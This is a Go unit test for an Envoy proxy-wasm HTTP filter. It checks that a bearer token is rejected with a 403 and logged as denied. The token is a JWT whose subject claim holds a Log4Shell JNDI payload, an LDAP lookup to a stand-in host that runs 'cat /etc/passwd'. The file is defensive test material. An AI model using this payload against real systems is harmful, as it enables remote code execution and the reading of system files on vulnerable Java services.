package main

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/proxytest"
	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/types"
)

var (
	// malicious JWT token wfor log4shell wth the following claim:
	// "sub": "${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"
	// This contains a payload taht will execute `cat /etc/passwd` on the vulnerable machine
	malicious = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
)

func TestHttpFilter_OnHttpRequestHeaders(t *testing.T) {
	opt := proxytest.NewEmulatorOption().WithVMContext(&vmContext{})
	host, reset := proxytest.NewHostEmulator(opt)
	defer reset()

	// Call OnPluginStart -> the metric is initialized.
	status := host.StartPlugin()
	// Check the status returned by OnPluginStart is OK.
	require.Equal(t, types.OnPluginStartStatusOK, status)

	// Create http context.
	contextID := host.InitializeHttpContext()

	// Call OnHttpRequestHeaders no user
	action := host.CallOnRequestHeaders(contextID, [][2]string{}, false)
	require.Equal(t, types.ActionContinue, action)

	action = host.CallOnRequestHeaders(contextID, [][2]string{
		{"Authorization", "Bearer " + malicious},
	}, false)
	localResponse := host.GetSentLocalResponse(contextID)
	require.Equal(t, types.ActionPause, action)
	require.NotNil(t, localResponse)
	require.Equal(t, uint32(403), localResponse.StatusCode)

	host.CompleteHttpContext(contextID)

	// Check Envoy logs.
	logs := host.GetInfoLogs()
	require.Contains(t, logs, "no authorization header found")
	require.Contains(t, logs, "access granted for: anonymous")
	require.Contains(t, logs, "access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}")
}
